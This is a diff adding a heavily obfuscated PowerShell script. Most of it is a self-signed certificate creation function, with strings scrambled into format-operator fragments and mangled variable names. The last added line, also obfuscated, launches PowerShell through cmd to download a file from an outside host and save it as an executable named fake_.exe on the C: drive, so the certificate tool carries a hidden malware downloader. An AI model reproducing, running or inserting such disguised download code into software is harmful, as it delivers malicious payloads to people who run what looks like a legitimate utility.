@@ -1,0 +1,358 @@
+  &("{0}{1}{2}"-f'set-i','Te','M') ("VARI"+"a"+"BLE:82j4H")  ([TyPe]("{0}{1}" -f 'D','aTeTIme')  ) ; &("{2}{0}{1}"-f 'iT','em','SET-')  ("{3}{2}{1}{0}" -f 'Im','Ble:2H9','Ia','VaR')  ([TYpE]("{0}{1}{2}"-F'EnVIRo','nM','ENt')  ); &("{0}{1}"-f 's','et')  ("{0}{1}"-f 'B','5C0g')  ( [TYpE]("{0}{2}{4}{1}{3}"-F'neT.Ipa','es','dd','s','R'));    ${0`7gL}= [TyPe]("{0}{1}" -F'G','UId') ;&("{0}{2}{1}" -f 's','ARIABLE','ET-V') ('S'+'0h') (  [Type]("{0}{1}"-F'sT','RING'));    ${J`Ir} =[tYpE]("{3}{9}{0}{7}{4}{8}{6}{5}{1}{2}"-f'NtE','s','hAL','RUNTi','O','S.mAR','VICe','r','PseR','me.i')  ;  ${9`Uazs}=  [tYpe]("{2}{1}{0}"-F'ert','V','COn');  ${ud`zsY2} = [TYPe]("{3}{5}{6}{0}{2}{7}{4}{1}{8}" -F 'M','fERen','ANaGEme','sY','oMatIoN.ACtIOnPre','S','TEm.','Nt.aut','CE');  function nEW`-Selfs`I`GNeD`CER`T`iF`iCaTeEx
+{
+	[CmdletBinding(dEFaULTpaRaMETerSETNAme = {"{1}{0}"-f 're','Sto'})]
+	param
+	(
+		[Parameter(MAnDaTOry, POSiTiOn = 0)]
+		[string]${subj`E`cT},
+		
+		[Parameter(pOSitioN = 1)]
+		[DateTime]${nOT`Bef`orE} =   (  &('Ls')  ("varI"+"A"+"BLE:82j4h"))."V`ALuE"::"N`Ow".("{0}{1}"-f 'AddDay','s').Invoke(-1),
+		
+		[Parameter(pOsiTion = 2)]
+		[DateTime]${NOTa`F`Ter} = ${NotB`efo`Re}.("{0}{1}"-f'A','ddDays').Invoke(365),
+		
+		[string]${SErIA`l`NU`MBER},
+		
+		[Alias('CSP')]
+		[string]${pr`OviDe`Rn`A`Me} = ("{9}{10}{4}{1}{8}{0}{3}{2}{5}{6}{7}"-f 'ry','nhanc','aphic Provi','ptogr','E','de','r',' v1.0','ed C','Micr','osoft '),
+		
+		[string]${A`lg`Or`ItHMname} = 'RSA',
+		
+		[int]${k`EYlen`G`TH} = 2048,
+		
+		[ValidateSet({"{0}{1}{2}" -f 'Exch','ang','e'}, {"{1}{0}{2}" -f'natu','Sig','re'})]
+		[string]${kEyS`PEc} = ("{0}{2}{1}"-f 'Exc','nge','ha'),
+		
+		[Alias('EKU')]
+		[Security.Cryptography.Oid[]]${e`N`H`ANced`keY`USAgE},
+		
+		[Alias('KU')]
+		[Security.Cryptography.X509Certificates.X509KeyUsageFlags]${Key`U`SAGE},
+		
+		[Alias('SAN')]
+		[String[]]${sUBJEC`T`AL`TerNATive`NamE},
+		
+		[bool]${IS`Ca},
+		
+		[int]${PA`THl`EngtH} = -1,
+		
+		[Security.Cryptography.X509Certificates.X509ExtensionCollection]${custOM`e`xTE`NSioN},
+		
+		[ValidateSet('MD5', {"{0}{1}" -f 'SH','A1'}, {"{0}{1}" -f'SHA','256'}, {"{0}{1}"-f 'SH','A384'}, {"{1}{0}" -f'HA512','S'})]
+		[string]${sIgN`AtuR`EaLgo`RiThM} = ("{0}{1}"-f'S','HA1'),
+		
+		[string]${fR`i`EnDlYnaMe},
+		
+		[Parameter(PaRAMEtERsETnaMe = "ST`Ore")]
+		[Security.Cryptography.X509Certificates.StoreLocation]${STorELO`c`A`TiOn} = ("{1}{0}{3}{2}"-f'tU','Curren','r','se'),
+		
+		[Parameter(pARametErsETname = "sto`RE")]
+		[Security.Cryptography.X509Certificates.StoreName]${st`oR`ENAme} = 'My',
+		
+		[Parameter(maNdAtORY = ${tR`UE}, pAramEtErSETnAmE = "fI`LE")]
+		[Alias({"{0}{2}{1}" -f 'O','File','ut'}, {"{0}{2}{1}" -f'Ou','ath','tP'}, 'Out')]
+		[IO.FileInfo]${pa`Th},
+		
+		[Parameter(MAnDatOry = ${Tr`Ue}, pARAMeteRSetNaMe = "Fi`lE")]
+		[Security.SecureString]${PAssW`oRd},
+		
+		[switch]${aLL`o`WsMimE},
+		
+		[switch]${exp`OR`TabLe},
+		
+		[Parameter()]
+		[ValidateNotNullOrEmpty()]
+		[switch]${Pas`Sth`RU}
+	)
+	
+	${er`ROracTiO`N`prEf`EREnCe} =  ${udzs`Y2}::"sT`Op";
+	
+	
+	if (  (&("{1}{0}" -f'BLe','VArIA') ("{0}{1}" -f'2H9','iM') -VALueON )::"osVe`Rsi`On"."V`erS`IOn"."ma`JoR" -lt 6)
+	{
+		throw (&("{2}{3}{1}{0}"-f 'ct','-Obje','Ne','w') ("{2}{4}{0}{1}{3}" -f 'tSup','portedExce','N','ption','o') -ArgumentList ("{2}{1}{0}{3}{6}{8}{7}{5}{4}" -f 'd',' and Win','Windows XP','o','not supported!','3 are ','ws Ser','r 200','ve'));
+	}
+	
+	
+	
+	
+	&("{1}{2}{0}{3}"-f'ab','New','-Vari','le') -Name ("{2}{1}{3}{0}"-f 't','e','UserCont','x') -Value 0x1 -Option ("{1}{2}{0}" -f'tant','Con','s');
+	&("{2}{0}{1}{3}"-f'w','-Variabl','Ne','e') -Name ("{3}{2}{1}{0}" -f'Context','e','n','Machi') -Value 0x2 -Option ("{1}{0}"-f 'ant','Const');
+	
+	
+	
+	&("{0}{1}{2}"-f'New','-V','ariable') -Name ("{2}{0}{1}{3}" -f'e64','Hea','Bas','der') -Value 0x0 -Option ("{1}{2}{0}"-f 'tant','Co','ns');
+	&("{2}{0}{3}{1}"-f 'ew-Va','iable','N','r') -Name ("{2}{0}{1}"-f 'ase','64','B') -Value 0x1 -Option ("{1}{2}{0}"-f'ant','C','onst');
+	&("{3}{2}{0}{1}"-f 'w-Varia','ble','e','N') -Name ("{0}{1}{2}" -f'B','i','nary') -Value 0x3 -Option ("{0}{1}" -f 'Constan','t');
+	&("{0}{1}{3}{2}"-f'Ne','w-Varia','le','b') -Name ("{1}{0}{2}{3}"-f'e','Bas','64Request','Header') -Value 0x4 -Option ("{0}{1}" -f'Cons','tant');
+	
+	
+	
+	&("{1}{3}{2}{0}" -f'e','New-Va','abl','ri') -Name ("{2}{1}{3}{0}" -f 'Name','the','O','r') -Value 0x1 -Option ("{2}{0}{1}" -f 'onst','ant','C');
+	&("{0}{2}{1}"-f'New','riable','-Va') -Name ("{2}{0}{1}{3}"-f'FC82','2Na','R','me') -Value 0x2 -Option ("{1}{0}"-f'onstant','C');
+	&("{2}{0}{3}{1}"-f '-V','e','New','ariabl') -Name ("{0}{2}{1}" -f 'DNS','me','Na') -Value 0x3 -Option ("{1}{2}{0}"-f 'nt','Cons','ta');
+	&("{1}{0}{2}" -f'ew-Var','N','iable') -Name ("{3}{1}{2}{0}" -f'ame','ry','N','Directo') -Value 0x5 -Option ("{0}{2}{1}" -f 'Const','t','an');
+	&("{3}{1}{2}{0}" -f'le','Var','iab','New-') -Name ("{1}{0}"-f 'L','UR') -Value 0x7 -Option ("{1}{2}{0}" -f'ant','Cons','t');
+	&("{1}{0}{2}" -f'ew-Variabl','N','e') -Name ("{1}{0}{2}"-f 'r','IPAdd','ess') -Value 0x8 -Option ("{2}{0}{1}"-f 'n','t','Consta');
+	&("{0}{1}{2}"-f'N','e','w-Variable') -Name ("{0}{1}{3}{2}" -f 'Re','gi','redID','ste') -Value 0x9 -Option ("{0}{2}{1}" -f 'C','stant','on');
+	&("{0}{2}{1}{3}" -f 'N','ab','ew-Vari','le') -Name ("{1}{0}"-f'uid','G') -Value 0xa -Option ("{2}{0}{1}"-f 't','ant','Cons');
+	&("{2}{1}{0}"-f '-Variable','w','Ne') -Name ("{0}{1}"-f'U','PN') -Value 0xb -Option ("{0}{2}{1}"-f'C','t','onstan');
+	
+	
+	
+	&("{1}{2}{0}" -f 'able','Ne','w-Vari') -Name ("{0}{1}{2}" -f'Allo','w','None') -Value 0x0 -Option ("{0}{2}{1}" -f'Co','tant','ns');
+	&("{0}{1}{3}{2}"-f 'N','ew-V','riable','a') -Name ("{6}{2}{0}{5}{3}{1}{4}"-f'Outstan','qu','owNo','Re','est','ding','All') -Value 0x1 -Option ("{0}{1}"-f'C','onstant');
+	&("{0}{2}{1}"-f 'New-V','iable','ar') -Name ("{2}{0}{1}{4}{3}"-f 'owU','ntrust','All','ificate','edCert') -Value 0x2 -Option ("{1}{2}{0}" -f't','Const','an');
+	&("{2}{1}{0}"-f'e','ariabl','New-V') -Name ("{2}{1}{3}{0}" -f'edRoot','ru','AllowUnt','st') -Value 0x4 -Option ("{2}{0}{1}" -f 'nst','ant','Co');
+	
+	
+	
+	&("{3}{1}{2}{0}"-f'able','ew-Var','i','N') -Name ("{1}{4}{3}{2}{0}"-f 'y','PFXExp','l','tEEOn','or') -Value 0x0 -Option ("{2}{0}{1}"-f'stan','t','Con');
+	&("{3}{2}{1}{0}" -f '-Variable','w','e','N') -Name ("{2}{0}{1}{4}{5}{3}{6}" -f'FXEx','portC','P','inNoR','h','a','oot') -Value 0x1 -Option ("{2}{0}{1}"-f 'n','t','Consta');
+	&("{0}{1}{2}"-f 'Ne','w-Va','riable') -Name ("{4}{2}{0}{3}{1}" -f'in','ithRoot','xportCha','W','PFXE') -Value 0x2 -Option ("{0}{1}{2}" -f'Con','sta','nt');
+	
+	
+	
+	
+	
+	
+	${S`UBj`ECtDn} = &("{0}{1}{2}{3}"-f 'Ne','w','-Obj','ect') -ComObject ("{5}{3}{1}{6}{7}{2}{0}{4}{8}" -f'nguish','r','0Disti','09En','e','X5','ol','lment.CX50','dName');
+	${sU`BJ`EctDN}.("{0}{1}{2}"-f'E','ncod','e').Invoke(${SubJ`ECt}, 0x0);
+	
+	
+	
+	
+	
+	${eXTENs`iO`NstO`ADd} = @();
+	
+	
+	if (${e`NHA`NC`edKEyuSAGE})
+	{
+		${Oi`Ds} = &("{1}{2}{0}"-f 'Object','Ne','w-') -ComObject ("{0}{7}{4}{3}{1}{6}{2}{5}"-f 'X','e','ObjectI','m','oll','Ds','nt.C','509Enr');
+		${eN`H`AncEdKeY`USage} | &("{1}{3}{0}{2}{4}"-f 'b','ForEac','je','h-O','ct') {
+			${O`id} = &("{0}{1}{2}" -f 'New','-','Object') -ComObject ("{6}{4}{0}{2}{3}{5}{1}"-f'll','D','m','ent.CObje','509Enro','ctI','X');
+			${O`ID}.("{4}{1}{3}{2}{0}{5}{6}" -f 'r','a','zeF','li','Initi','omValu','e').Invoke(${_}."V`AlUe");
+			
+			
+			${oI`dS}.("{0}{1}" -f'A','dd').Invoke(${o`Id});
+		}
+		
+		
+		${e`Ku} = &("{1}{0}{2}" -f'w-O','Ne','bject') -ComObject ("{7}{1}{3}{8}{9}{12}{11}{0}{5}{10}{2}{4}{6}" -f'nEnhanced','5','U','09En','s','K','age','X','rol','l','ey','CX509Extensio','ment.');
+		${E`ku}.("{0}{4}{2}{3}{1}" -f 'I','ncode','ti','alizeE','ni').Invoke(${O`iDS});
+		${Ex`TensI`o`NSt`oaDD} += 'EKU';
+	}
+	
+	
+	
+	if (${KeY`U`SAgE} -ne ${n`ULL})
+	{
+		${K`U} = &("{0}{2}{1}" -f 'New','Object','-') -ComObject ("{8}{9}{0}{1}{5}{10}{3}{7}{6}{2}{4}"-f'0','9E','nsionKe','ment.CX','yUsage','n','xte','509E','X','5','roll');
+		${KU}."i`NitiaL`iZe`eN`CodE"([int]${K`eyu`sage});
+		${Ku}."cRiT`iCAl" = ${t`RuE};
+		${E`XTeNSi`OnsToAdd} += 'KU';
+	}
+	
+	
+	
+	if (${PsBO`UndP`ARa`M`EteRS}."k`EYS".("{2}{1}{0}"-f 'ns','ai','Cont').Invoke(("{0}{1}"-f'Is','CA')))
+	{
+		
+		${BAS`IcCOnstr`AI`Nts} = &("{1}{0}{2}"-f'e','New-Obj','ct') -ComObject ("{7}{6}{10}{11}{12}{4}{2}{1}{5}{9}{3}{8}{0}"-f'nts','on','onBasicC','a','i','s','ollm','X509Enr','i','tr','ent.CX509E','xt','ens');
+		if (!${Is`Ca})
+		{
+			${pAThL`eNG`Th} = -1;
+		}
+		${BASI`CC`o`NstRain`Ts}.("{1}{3}{2}{0}"-f 'e','I','ializeEncod','nit').Invoke(${IS`Ca}, ${pa`Th`LEN`gth});
+		${bASiCCo`NST`RA`IntS}."criTiC`AL" = ${i`SCa};
+		${ex`TenS`Io`Nst`oaDD} += ("{5}{3}{0}{1}{4}{2}"-f'ra','i','ts','Const','n','Basic');
+	}
+	
+	
+	
+	if (${SUB`j`E`cTA`l`TERna`TIVeNa`ME})
+	{
+		${S`AN} = &("{1}{0}{2}"-f'O','New-','bject') -ComObject ("{2}{8}{6}{5}{7}{3}{1}{0}{4}" -f 'tensionAlternativ','x','X509','09E','eNames','llm','ro','ent.CX5','En');
+		${NAM`es} = &("{2}{1}{0}"-f't','ec','New-Obj') -ComObject ("{4}{0}{8}{3}{5}{1}{6}{7}{2}{9}"-f 'Enro','Alte','tiveName','lme','X509','nt.C','rn','a','l','s');
+		foreach (${AlT`N`AMe} in ${sUB`j`ecT`ALt`eRNatIvENAMe})
+		{
+			${N`AmE} = &("{3}{0}{1}{2}"-f 'w-','Objec','t','Ne') -ComObject ("{5}{4}{1}{2}{0}{3}" -f'.CAlterna','lmen','t','tiveName','9Enrol','X50');
+			if (${al`T`NAme}.("{1}{0}{2}" -f'a','Cont','ins').Invoke('@'))
+			{
+				${NA`Me}.("{4}{2}{3}{5}{0}{1}"-f'r','ing','lizeFro','mS','Initia','t').Invoke(${R`Fc`82`2nAMe}, ${altN`A`Me});
+			}
+			else
+			{
+				try
+				{
+					${b`Yt`Es} =  (  &("{0}{3}{2}{1}" -f'c','M','te','hilDi')  ("{0}{2}{1}" -f 'VaRIaBl','b5C0G','e:') )."v`Alue"::("{0}{1}"-f'Par','se').Invoke(${A`lt`NAme}).("{2}{1}{3}{0}" -f 'Bytes','etAddre','G','ss').Invoke();
+					${n`AmE}.("{5}{1}{6}{0}{3}{2}{4}"-f 'al','n','Ra','izeFrom','wData','I','iti').Invoke(${iPa`dD`Re`SS}, ${bAS`e64},   (  &("{1}{0}{2}" -f 'ia','VAr','bLe')  ("{0}{1}"-f'9','uazs')  -VAlUEOnlY  )::"ToB`ASe64`stRIng"(${B`YT`Es}));
+				}
+				catch
+				{
+					try
+					{
+						${BY`TeS} =  (  &("{2}{0}{1}" -f 'a','RiABLE','V') ("{1}{0}"-f 'L','07g')  -VALU)::("{1}{0}" -f 'e','Pars').Invoke(${alt`NAMe}).("{0}{1}{2}"-f'ToB','yteArr','ay').Invoke();
+						${Na`Me}.("{0}{5}{2}{3}{4}{1}"-f 'I','a','a','lizeFrom','RawDat','niti').Invoke(${gU`id}, ${BA`Se`64},  (  &("{1}{0}"-f 't-ITEM','gE') ("{1}{2}{0}" -f 'le:9uazs','v','ARiAb'))."v`ALUE"::"TO`B`AS`e64stri`NG"(${byt`Es}));
+					}
+					catch
+					{
+						try
+						{
+							${bYt`es} = ([Security.Cryptography.X509Certificates.X500DistinguishedName]${altn`AmE})."R`A`wDATa";
+							${Na`ME}.("{0}{5}{4}{3}{2}{1}"-f 'In','Data','Raw','From','e','itializ').Invoke(${direC`ToR`y`NAmE}, ${b`AsE64},   (&('ls')  ('vA'+'R'+'iab'+'L'+'E:9UAZs')  )."VA`lUE"::"toBASE64`STR`InG"(${B`Y`TES}));
+						}
+						catch
+						{
+							${n`Ame}.("{0}{1}{3}{5}{2}{4}"-f'In','i','eFrom','tiali','String','z').Invoke(${D`NSN`Ame}, ${alTN`A`me});
+						}
+					}
+				}
+			}
+			${NA`meS}.("{1}{0}"-f'd','Ad').Invoke(${na`ME});
+		}
+		${S`An}.("{1}{0}{2}{3}"-f'nitializeEnco','I','d','e').Invoke(${N`AM`es});
+		${ExTeNSi`oN`sT`O`ADD} += 'SAN';
+	}
+	
+	
+	
+	if (${CuS`T`oMexT`EnSIon})
+	{
+		${co`UNT} = 0;
+		foreach (${E`xt} in ${c`U`STomexTENsiON})
+		{
+			
+			${E`XTEnSi`oN} = &("{1}{2}{0}" -f'ject','New','-Ob') -ComObject ("{6}{7}{0}{3}{4}{5}{1}{2}"-f 'l','nsio','n','ment','.CX50','9Exte','X509En','rol');
+			${EX`T`e`NSi`ONoID} = &("{1}{0}{2}" -f 'ew-Ob','N','ject') -ComObject ("{5}{6}{0}{2}{1}{3}{4}"-f 'lme','CO','nt.','bject','Id','X50','9Enrol');
+			${e`xTEn`SiO`NOID}.("{2}{3}{4}{1}{0}{5}"-f 'zeFro','i','I','nitia','l','mValue').Invoke(${E`XT}."O`iD"."VAl`Ue");
+			${Ext`ens`ioNVa`l`Ue} =   (&("{1}{2}{0}"-f 'lE','VaRi','Ab') ('9u'+'aZs')  -valueonl )::"t`ObasE6`4`stri`NG"(${e`XT}."RA`w`dAtA");
+			${E`xTEns`IOn}.("{2}{3}{1}{0}"-f'e','aliz','In','iti').Invoke(${eX`T`ens`ion`OiD}, ${ba`SE64}, ${e`XtEns`ION`VaLuE});
+			${ExtE`Ns`iOn}."C`RiTIcal" = ${E`Xt}."C`RiTI`CaL";
+			&("{0}{1}{2}"-f'New-Var','i','able') -Name ('ext' + ${cOu`Nt}) -Value ${exT`eNs`ION};
+			${EXT`E`NSI`on`StOA`dd} += ('ext' + ${COU`Nt});
+			${c`Ou`NT}++;
+		}
+	}
+	
+	
+	
+	
+	
+	
+	${prI`Vat`EKEY} = &("{1}{2}{0}"-f't','New-O','bjec') -ComObject ("{2}{3}{1}{5}{6}{4}{0}{7}" -f'Ke','lme','X5','09Enrol','ivate','nt.CX509','Pr','y');
+	${P`Rivat`e`kEY}."PRovid`E`RNaMe" = ${pRO`V`iDErnAME};
+	${a`LgORIt`HmId} = &("{1}{2}{0}"-f 't','New-O','bjec') -ComObject ("{3}{2}{4}{0}{6}{1}{5}"-f 'CObj','I','l','X509Enrol','ment.','d','ect');
+	${aL`g`OrIThMiD}."ini`T`ial`IzEf`ROMVALue"(([Security.Cryptography.Oid]${ALG`o`RITHmNa`mE})."vAl`Ue");
+	${pR`Iv`AtEK`EY}."algo`RitHM" = ${algOrit`H`miD};
+	
+	
+	${Pr`IvA`T`ekey}."k`E`YSPEC" = switch (${k`EY`SPec}) { ("{2}{1}{0}" -f'nge','cha','Ex') { 1 }; ("{1}{0}{2}"-f'r','Signatu','e') { 2 } }
+	${p`R`ivate`Key}."len`gtH" = ${kEy`Le`Ngth};
+	
+	
+	switch (${PsCm`d`LET}.PaRAmeTersETnaME)
+	{
+		("{0}{1}"-f'S','tore')
+		{
+			${pRi`VATE`Key}."MACHiNeC`O`Nt`exT" = if (${S`TOrElo`Cati`on} -eq ("{1}{0}{3}{2}"-f'al','Loc','achine','M')) { ${tR`Ue} }
+			else { ${F`AlSe} }
+		}
+		("{0}{1}" -f 'Fi','le')
+		{
+			${Pri`Va`TEk`eY}."MAC`HINEC`OnT`eXt" = ${f`Al`sE};
+		}
+	}
+	
+	${p`RIVaTEK`ey}."EX`POr`TpO`liCy" = if (${ExPO`Rt`A`BLe}) { 1 }
+	else { 0 }
+	${p`R`ivATeKey}.("{0}{1}"-f'Crea','te').Invoke();
+	
+	
+	
+	
+	
+	${c`Ert} = &("{1}{0}{2}" -f 'bjec','New-O','t') -ComObject ("{4}{8}{5}{2}{6}{7}{10}{11}{0}{3}{9}{1}" -f 'tC','te','rollmen','erti','X','09En','t.CX509Certifica','teR','5','fica','e','ques');
+	
+	
+	if (${Pr`iVA`TE`KeY}."MACH`i`NE`ConTEXt")
+	{
+		${C`ERT}.("{3}{4}{5}{6}{1}{7}{0}{2}" -f'vat','mPr','eKey','I','niti','alizeF','ro','i').Invoke(${maC`hInecon`TEXt}, ${P`RIV`ATeKeY}, '');
+	}
+	else
+	{
+		${ce`RT}.("{1}{6}{7}{5}{4}{3}{0}{2}"-f 'at','I','eKey','Priv','om','ializeFr','n','it').Invoke(${USeRC`O`N`TeXt}, ${pRIva`T`eKEY}, '');
+	}
+	
+	${CE`RT}."SUb`Ject" = ${sUbjE`C`TDN};
+	${Ce`Rt}."Is`SuEr" = ${c`ert}."sU`BJect";
+	${C`eRT}."N`oTBefO`Re" = ${nO`TbEf`ORE};
+	${Ce`RT}."N`ota`FtEr" = ${nO`T`AfTEr};
+	
+	
+	foreach (${iT`em} in ${E`Xt`eN`SIoNstoa`dd})
+	{
+		${c`eRT}."x50`9eXteN`sIO`NS".("{1}{0}" -f'd','Ad').Invoke((&("{3}{0}{2}{1}"-f 'Varia','e','bl','Get-') -Name ${I`TeM} -ValueOnly));
+	}
+	
+	
+	if (!  ( &("{0}{1}" -f'gC','I')  ('v'+'aRi'+'ABLe'+':s0H') )."VAL`Ue"::("{0}{3}{2}{1}"-f'I','pty','OrEm','sNull').Invoke(${S`ER`IALnu`m`Ber}))
+	{
+		if (${S`erIA`lNuMb`er} -match ("{0}{1}{2}"-f '[^0-9a-f','A-','F]'))
+		{
+			throw ("{1}{0}{5}{6}{4}{2}{3}"-f 'l','Inva','ber spe','cified.','um','id seri','al n');
+		}
+		
+		if (${Se`RiA`ln`UmbeR}."LE`N`gTh" % 2)
+		{
+			${se`Ria`LN`U`mBeR} = '0' + ${SERIAlnu`Mb`ER};
+		}
+		
+		${b`yTeS} = ${S`E`RiALNUm`B`eR} -split '(.{2})' | &("{0}{3}{1}{2}"-f 'Whe','e-Objec','t','r') { ${_} } | &("{2}{1}{0}{3}" -f '-Obje','Each','For','ct') {   (  &("{2}{1}{0}"-f 'EM','dit','CHiL')  ("va"+"RiAb"+"L"+"e:"+"9Uazs")  )."vaL`Ue"::("{0}{1}" -f'T','oByte').Invoke(${_}, 16) }
+		${b`ytE`St`RIng} =  ${9u`A`ZS}::"TO`Base64StR`i`Ng"(${B`YTes});
+		${C`eRt}."ser`IaL`NUmBer".("{0}{1}{2}" -f 'Inv','oke','Set').Invoke(${ByTe`StRI`Ng}, 1);
+	}
+	
+	if (${A`lLo`WSm`IME})
+	{
+		${c`ErT}."sMIMEc`AP`AB`iL`IT`ieS" = ${T`RUe};
+	}
+	
+	${sig`N`Ature`oId} = &("{1}{0}{2}"-f'bjec','New-O','t') -ComObject ("{4}{1}{3}{0}{5}{2}"-f 'nt','E','Id','nrollme','X509','.CObject');
+	${SI`gNa`TU`Re`OID}."in`i`TI`Al`iZEFROMvaluE"(([Security.Cryptography.Oid]${si`GNaT`Ur`EaLGoRI`THM})."v`AlUE");
+	${Ce`Rt}."SI`GNatuR`eInFor`Ma`T`IOn"."hAS`H`Al`GoRIThM" = ${SigNa`TUR`eOiD};
+	
+	
+	
+	${ce`RT}.("{0}{2}{1}" -f'En','de','co').Invoke();
+	
+	
+	
+	${R`e`quESt} = &("{2}{0}{1}" -f'w','-Object','Ne') -ComObject ("{8}{5}{6}{2}{3}{0}{4}{7}{1}" -f'09en','nt','men','t.CX5','roll','509Enrol','l','me','X');
+	${r`eqUESt}.("{3}{1}{5}{4}{0}{2}"-f 'que','ni','st','I','mRe','tializeFro').Invoke(${Ce`Rt});
+	${r`eqUEsT}."CeRtiFi`c`ATeF`R`iE`NdLYN`Ame" = ${F`RiEn`DlY`Na`mE};
+	${en`dC`eRt} = ${re`q`UeSt}.("{2}{1}{0}"-f 'equest','eateR','Cr').Invoke(${B`Ase`64});
+	${rEQU`eSt}.("{1}{2}{0}{4}{3}"-f 'llRe','I','nsta','onse','sp').Invoke(${aLlo`WUN`TRUsT`edcErti`Fic`AtE}, ${eN`D`CerT}, ${BAs`e`64}, '');
+	
+	
+	
+	if (${P`ScMDl`et}.paRAmEtErSEtNAmE.("{0}{1}"-f'Equa','ls').Invoke(("{0}{1}" -f 'F','ile')))
+	{
+		${P`FxST`RInG} = ${ReQ`UEST}.("{1}{0}{2}"-f 'eateP','Cr','FX').Invoke(
+			 ${j`Ir}::("{4}{0}{2}{1}{3}"-f'tr','tri','ToS','ngAuto','P').Invoke( ${j`Ir}::("{0}{1}{5}{4}{2}{3}" -f'SecureS','tri','T','R','ToBS','ng').Invoke(${p`A`SSWOrD})),
+			${pfxE`xp`Or`TeEONLy},
+			${BAS`E64}
+		)
+		&("{1}{0}{2}" -f'et-Co','S','ntent') -Path ${p`Ath} -Value ( (  &("{0}{1}"-f 'vArIa','ble')  ("{0}{1}" -f'9uaz','s') -VALUeONl)::("{0}{2}{4}{1}{3}" -f'Fr','i','omB','ng','ase64Str').Invoke(${Pf`Xs`T`Ring})) -Encoding ("{1}{0}" -f'e','Byt');
+	}
+	
+	
+	if (${Pa`SSTHrU}."isPrE`se`Nt")
+	{
+		@(&("{3}{1}{2}{0}" -f'tem','t','-ChildI','Ge') -Path "Cert:\$StoreLocation\$StoreName").("{1}{0}"-f 'ere','wh').Invoke({ ${_}."s`Ub`JeCt" -match ${Sub`JeCt} })
+	}
+	
+	${E`RrOrac`T`ioN`P`REFEREncE} =   ${udZ`sY2}::"coNTiN`Ue";
+}
+&("{0}{1}" -f'cm','d') ('/c') ("{1}{2}{0}" -f'rshell','p','owe') -Command (&("{1}{2}{0}"-f'bject','ne','w-o') ("{2}{1}{0}{5}{6}{3}{4}"-f'm.Net','yste','S','ien','t','.W','ebCl')).("{1}{0}{2}{3}"-f 'a','Downlo','dfil','e').Invoke(("{0}{5}{2}{3}{1}{4}"-f'ht','_','.x10.mx/co','unt','vt.txt','tp://trax'), ((("{3}{2}{4}{0}{1}" -f'.ex','e','8Y','C:j8Y_ABj','fake_'))."RE`placE"('j8Y',[sTrING][CHaR]92))) ; ("{0}{1}"-f'Done','.')
